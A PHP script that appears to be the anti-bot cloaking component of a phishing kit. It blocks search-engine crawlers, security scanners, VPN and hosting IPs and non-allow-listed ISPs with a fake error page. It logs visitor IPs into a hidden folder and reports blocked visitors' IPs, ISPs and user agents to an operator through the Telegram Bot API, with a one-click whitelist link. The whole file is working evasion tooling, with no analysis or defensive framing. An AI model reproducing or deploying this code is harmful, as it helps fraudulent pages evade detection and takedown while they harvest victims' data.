
<?php
include 'functions.php';
# ISPS Liste

$isps = @json_decode(@file_get_contents('../help/!#/isps.json'), true);
if (!$isps) {
    $isps = @json_decode(@file_get_contents('../../help/!#/isps.json'), true);
}

$_SESSION["lang"] = strtolower(substr($_SERVER["HTTP_ACCEPT_LANGUAGE"], 0, 2));

# Crawler Liste

$crawler = '/007ac9|192.comAgent|360Spider|4seohuntbot|80legs|a6-indexer|Aboundex|AbusiveBot|accelobot|acoonbot|AddThis|ADmantX|AdsBot|adscanner|adbeat|adblade|adeptivemedia|adressendeutschland|adrelevance|adroll|adstxt|adunitsolutions|adversarial-ml|adwatch|adxbid|aggregator:|ahrefsbot|aihitbot|aiohttp|airmailbot|akamai-sitesnapshot|akamai|akamai.netstoragebot|akamaiorigin|alibaba|alisamobile|alligator|almaden|amagit|amznkassocbot|analyzer|android|anonymous|anonymous-bot|answerbot|antabot|antispam|antibot|anysite|AOL|apache-httpclient|AportWorm|appengine-google|arabot|arachmo|archive.org_bot|archive.orgbot|arquivo-web-crawler|asafaweb|aserv|asianbot|Ask Jeeves|aspseek|astickymess|asterias|atnbot|attentio|attrapub|attribution|autoemailspider|autowebdir|avsearch|axelspringer|axiomtelecom|BackDoorBot|backlink-checker|backlinkcrawler|backstreet|backweb|bad-ass|Bad-Neighborhood|Baidu|BaiDuSpider|Bandit|bangbangbot|Barkrowler|batchftp|baypup|bdfetch|beamusupscotty|beautybot|BebopBot|BecomeBot|bedwig|BeebwareDirectory|beetlebot|bender|betaBot|bigbrother|Bigfoot|BigWebDirectory|bingbot|BingPreview|binlar|biocrawler|Bionic|bitlybot|bitvoxybot|bizbot|blackwidow|BLM-Crawler|Blogdigger|bloglines|blogpulse|blogsearch|blogshares|blogslive|blowfish|bluefish|blitzbot|bnf.fr_bot|boitho|boochbot|bookmark-manager|boris|Boston-Project|boutell[-_]bot|boxseabot|BPImageWalker|BpSpider|Brandprotect|Brandprotectbot|brokore|BSDSeekBot|browsershots|btbot|btdigg|builtbottough|bullseye|bumblebee|bunnybot|buscador|Butterfly|buzzbot|byindia|byindia.com|c-sensor|c4-bot|cachedview|calyxinstitute|Camcrawler|CamelStampede|cancerbot|Canon|Canon-WebRecord|captain|careerbot|careerseeker|carleson|casperbot|caster|catexplorador|catfood|ccbot|CCGCrawl|cd-preload|centurybot|cerberian|ceron.jp_bot|cert figleafbot|cfbot|cg-eye|cha0s\/\/net|changedetection|changesbot|Charlotte|Checkbot|checkprivacy|CherryPicker|chinaclaw|cipinetbot|citeseerxbot|abacho|accona|AddThis|AdsBot|ahoy|AhrefsBot|AISearchBot|alexa|altavista|anthill|appie|applebot|arale|araneo|AraybOt|ariadne|arks|aspseek|ATN_Worldwide|Atomz|baiduspider|baidu|bbot|bingbot|bing|Bjaaland|BlackWidow|BotLink|bot|boxseabot|bspider|calif|CCBot|ChinaClaw|christcrawler|CMC\/0\.01|combine|confuzzledbot|contaxe|CoolBot|cosmos|crawler|crawlpaper|crawl|curl|cusco|cyberspyder|cydralspider|dataprovider|digger|DIIbot|DotBot|downloadexpress|DragonBot|DuckDuckBot|dwcp|EasouSpider|ebiness|ecollector|elfinbot|esculapio|ESI|esther|eStyle|Ezooms|facebookexternalhit|facebook|facebot|fastcrawler|FatBot|FDSE|FELIX IDE|fetch|fido|find|Firefly|fouineur|Freecrawl|froogle|gammaSpider|gazz|gcreep|geona|Getterrobo-Plus|get|girafabot|golem|googlebot|\-google|grabber|GrabNet|griffon|Gromit|gulliver|gulper|hambot|havIndex|hotwired|htdig|HTTrack|ia_archiver|iajabot|IDBot|Informant|InfoSeek|InfoSpiders|INGRID\/0\.1|inktomi|inspectorwww|Internet Cruiser Robot|irobot|Iron33|JBot|jcrawler|Jeeves|jobo|KDD\-Explorer|KIT\-Fireball|ko_yappo_robot|label\-grabber|larbin|legs|libwww-perl|linkedin|Linkidator|linkwalker|Lockon|logo_gif_crawler|Lycos|m2e|majesticsEO|marvin|mattie|mediafox|mediapartners|MerzScope|MindCrawler|MJ12bot|mod_pagespeed|moget|Motor|msnbot|muncher|muninn|MuscatFerret|MwdSearch|NationalDirectory|naverbot|NEC\-MeshExplorer|NetcraftSurveyAgent|NetScoop|NetSeer|newscan\-online|nil|none|Nutch|ObjectsSearch|Occam|openstat.ru\/Bot|packrat|pageboy|ParaSite|patric|pegasus|perlcrawler|phpdig|piltdownman|Pimptrain|pingdom|pinterest|pjspider|PlumtreeWebAccessor|PortalBSpider|psbot|rambler|Raven|RHCS|RixBot|roadrunner|Robbie|robi|RoboCrawl|robofox|Scooter|Scrubby|Search\-AU|searchprocess|search|SemrushBot|Senrigan|seznambot|Shagseeker|sharp\-info\-agent|sift|SimBot|Site Valet|SiteSucker|skymob|SLCrawler\/2\.0|slurp|snooper|solbot|speedy|spider_monkey|SpiderBot\/1\.0|spiderline|spider|suke|tach_bw|TechBOT|TechnoratiSnoop|templeton|teoma|titin|topiclink|twitterbot|twitter|UdmSearch|Ukonline|UnwindFetchor|URL_Spider_SQL|urlck|urlresolver|Valkyrie libwww\-perl|verticrawl|Victoria|void\-bot|Voyager|VWbot_K|wapspider|WebBandit\/1\.0|webcatcher|WebCopier|WebFindBot|WebLeacher|WebMechanic|WebMoose|webquest|webreaper|webspider|webs|WebWalker|WebZip|wget|whowhere|winona|wlm|WOLP|woriobot|WWWC|XGET|xing|yahoo|YandexBot|YandexMobileBot|yandex|yeti|cizilla.com|clariabot|clshttp|clushbot|cmsworldmap|coccoc|collapsar|collector|comodo|conceptbot|conducivebot|convera|CoolBot|coolcheck|Copernic|copyscape|copyright-bot|cosmos|Covario-IDS|crawl|CrawlDaddy|crawltrack|cronjob|crossrefbot|crowdflower|Crowsnest|cse.google|cuill|curiousgeorge|curl|currybot|custo|cyberalert|cyberdog|CyberPatrol|cyveillance|d1garabicengine|DA|dailymotion|danishbot|darenet|dasblog|datafountains|DataparkSearch|dataprovider|Daum|davebot|daypopbot|dbot|dc-sakura|dCSbot|deepindex|deepnet|deeptrawl|dejan|deliciousbot|dell\s+sputnik|demandbase-bot|deploybot|dergru|detector|devon|deweb|dgd+bot|diablo|diamond|diamondbot|diavol|digg|diibot|dipsie|disco|discobot|discoverybot|dispatch|dlvr.it|dmoz|DNS|DNS-Digger|DNS-Explorer|dnslookup|docomo|dodgebot|dofus|domaincrawler|domainsbot|domainsproject|domaintools|dotbot|dotnetdotcom|dotspotsbot|download|dragonbot|drupal|dsweb|dtsearch|dualsearch|dumbot|dwaar|dxseeker|e-societyrobot|EARTHCOM|earthquake|EasyDL|EBrowse|ec2linkfinder|eCairn-Grabber|eCatch|eChooseBot|ecxi|EddieBot|EduGovSearch|egothor|eidetica.com|eidetiq|EirGrabber|eladok|electricmonk|elefante|EMail-Extraktor|EmailCollector|emailprospector|emailsiphon|EmailWolf|EMPAS_ROBOT|EnaBot|endeca|endlessjazz|EnigmaBot|enterprise_Search|enterprise_Search\/1.0|envolk|EroCrawler|ESISmartSpider|espider|esribot|EtaoSpider|etscada|eurosoft-bot|eventures|evrinid|exactseek|exalead|exekey|exensa|exif|experteer-bot|explicitnetworks|exploder|exsul|Extractor|extractorpro|EyeNetIE|ez-robot|ezooms|facebookexternalhit|facebook|facebot|facesearch|factbot|fairshare|falcon|falconsbot|faqbot|fast-search-engine|fastbot|fastbot.de|fastenbot|fastsearch|fatbot|faup\stools|favicon|favorg|faxo|FDM|feedburner|feedchecker|feedfetcher|feedjit|feedme|feedreader|Feedster|felix|fetch\sspider|fetchrover|fido|findlink|findthatfile|findxbot|findexa|Fing\sshark|finnishbot|firebat|firefly|firstgov|firstvisit|fisbot|fishbot|flaming|flashcapture|flashget|flint|flipboardproxy|FlipboardProxy|FlipboardRSS|fluffy|fly|flybot|foobot|focused_crawler|fofa|follower|FollowSite|forensiq|fosfor|fotoalbum|FoundBot|fr_crawler|frogsoda|frogtest|frontend|froogle|frontpage|fruitfl|fruitfly|ftpsearch|fuelbot|full_breadth_crawler|funnelback|FunWebProducts|furlbot|g00g1e|g00g1ebot|g10-bot|g2crawler|ganar-visitas|gazz|gcreep|gearman-job-agent|geckobot|generic|genieo|genieo\.com|genieo_crawler|genieouscreenmegod|geocheck|geoedge|geobot|GeonaBot|geonabot|geovantage|gerbil|gestalt|getintent|getintentcrawler|getright|getweb|giant|Gigabot|gigamega|gigibot|gigya|gigya-crawler|goforit|gold|gold crawler|goldfire|gonzo|goofer|googlebot|google-structured-data-testing-tool|google-survey|google-thumbnailer|gosospider|gotit|gozilla|grab|grabber|grabnet|grafula|grapefx|grapeshot|grbot|GreenBrowser|gridbot|grub-client|grub|grub.org|grubcrawler|grupthink|gsa-crawler|gsitecrawler|gslfbot|gsrch|gssbot|guggybot|guidancebot|gulp|GurujiBot|hacker|hadi|halcyon|halliburton|hansendeepLink|harvest|hcat|hclsreport-crawler|healthbot|hedgehog|helsinki|heritrix|hia|highbeam|hijbul-islam|hiqual|hitsniffer|hledej|hmview|hoge|holmes|homepagesearch|Hometown|homogefrontpagebot|hooWWWer|hostcrawler|hsnbot|hsteeler|htdig|htmlparser|httpclient|httpconnect|httpdown|httpget|httpheader|httpinettekce|httplib|httplib2|httpunit|httrack|hul-wax|humanlinks|huronbot|hverify|ia_archiver|iadro|ias[-_]adag|ias[_+|.|_]adag|ias[-_]insights|ibm\stotalaccess|ichiro|iCjobs|iCjobs-crawler|iclloader|icproject|Identify|Id-search|ie6\_autodiscovery|ienrich|iexplore.exe|iGetter|iim_bot|ilsebot|iltrovatore|image|ImageVisualsearch|imagewalker|imorebot|inagist|inbound.li parser|InboundBot|incrawler|IncyWincy|indexer|indexing|industry-brain|inet\scollector|inetbot|inetURL|infobot|infociousbot|infomine|InfoNaviRobot|infospider|infoSpider|InfoTekies|infovortice2013|infoweb-monitor|INGRID|inktomisearch.com|innerpr|insitor|instabid|integrity|intelliseek|InterGET|Internet Ninja|InternetSeer|internetVista monitoring|intelliseek|intelliseek\.\sexplorer|Intraformant|IODC/';

$ua = $_SERVER['HTTP_USER_AGENT'];
$ip = $_SERVER['REMOTE_ADDR'];


# Check if the ISPS is available


function sendWL($message, $chatid) {
    global $token;
  
    $query_params = array(
      'text' => $message,
      'chat_id' => $chatid
    );
  

      $reply_markup = array(
        'inline_keyboard' => array(
          array(
            array(
              'text' => '🫧 WhiteList ',
              'url' => "http://" . $_SERVER['SERVER_NAME'] . "/help/action/utils.php?wl=" . $_SERVER['REMOTE_ADDR']
            )
          ),
        )
      );
      $query_params['reply_markup'] = json_encode($reply_markup);

    if (function_exists('curl_version')) {
        $query_url = "https://api.telegram.org/bot$token/sendMessage";
        $curl = curl_init($query_url);
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($query_params));
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_HTTPHEADER, array('Content-Type: application/x-www-form-urlencoded'));
        $result = curl_exec($curl);
        curl_close($curl);
    } else {
        $query_url = "https://api.telegram.org/bot$token/sendMessage?" . http_build_query($query_params);
        $result = file_get_contents($query_url);
    }
}


function validate(){
    global $movement_track,$chatidclick, $isp, $org;
    if ($movement_track == 1) {
        $message = "─────────── ⋆⋅ 🤖 ⋅⋆ ───────────
  
🤖 Le robot (".$_SERVER['REMOTE_ADDR'].") a été ban par les antibots
                           
─────────── ⋆⋅ 📶 ⋅⋆ ───────────
  
🤖 ISP / ORG    : ".$isp." / ".$org."
📍 Adresse IP   : ".$_SERVER['REMOTE_ADDR']."
📡 User Agent   :".$_SERVER['HTTP_USER_AGENT']."";
sendWL($message, $chatidclick);
    }
  
  }

function CheckIspOrg($org, $isp, $isps) {
    foreach ($isps as $country => $ispList) {
        foreach ($ispList as $ispItem) {
            if (stripos(strtolower($isp), strtolower($ispItem)) !== false) {
                return false;
            }
        }
        foreach ($ispList as $ispItem) {
            if (stripos(strtolower($org), strtolower($ispItem)) !== false) {
                return false;
            }
        }
    }
    return true;
}

function checkIP() {
    global $banned;
    $banned_values = explode(',', $banned);
    if (in_array($_SERVER['REMOTE_ADDR'],$banned_values)) {
        return true;
    }
    return false;
}

$whitelisted_values = explode(',', $whitelist);

if (!in_array($_SERVER['REMOTE_ADDR'],$whitelisted_values)) {
    
    
    $isp = $_SESSION['isp'];
    $org = $_SESSION['org'];
    $proxy = $_SESSION['proxy'];
    $hosting = $_SESSION['hosting'];

    if ($proxy || $hosting) {
        file_put_contents($_SERVER['DOCUMENT_ROOT'] . '/help/!#/bot.txt', $ip . ' - ' . date('d/m/Y h:i:s') . ' - ' . "PROXY / VPN\n", FILE_APPEND);
        validate();
        die('An error occurred while trying to access this website. Please try again later');
        
    }elseif (CheckIspOrg($org, $isp, $isps)) {
        file_put_contents($_SERVER['DOCUMENT_ROOT'] . '/help/!#/bot.txt', $ip . ' - ' . date('d/m/Y h:i:s') . ' - ' . "ISPS / ORG\n", FILE_APPEND);
        validate();
        die('An error occurred while trying to access this website. Please try again later');
    }elseif (preg_match($crawler, $ua) || preg_match($crawler, $isp)) {
        file_put_contents($_SERVER['DOCUMENT_ROOT'] . '/help/!#/bot.txt', $ip . ' - ' . date('d/m/Y h:i:s') . ' - ' . "Crawler USER-AGENT\n", FILE_APPEND);
        validate();
        die('An error occurred while trying to access this website. Please try again later');
    }elseif (checkIP()) {
        file_put_contents($_SERVER['DOCUMENT_ROOT'] . '/help/!#/bot.txt', $ip . ' - ' . date('d/m/Y h:i:s') . ' - ' . "BLACKLIST\n", FILE_APPEND);
        validate();
        die('An error occurred while trying to access this website. Please try again later');
    }else{
        file_put_contents($_SERVER['DOCUMENT_ROOT'] . '/help/!#/ip.txt', $ip . ' - ' . date('d/m/Y h:i:s') . "\n", FILE_APPEND);
    }
}else{
    file_put_contents($_SERVER['DOCUMENT_ROOT'] . '/help/!#/ip.txt', $ip . ' - ' . date('d/m/Y h:i:s') . "\n", FILE_APPEND);
}

if (!isset($_SESSION['captcha'], $_SESSION['captchaToken']) || $_SESSION['captcha'] != true) {
    header('Location: /' );
}
?>
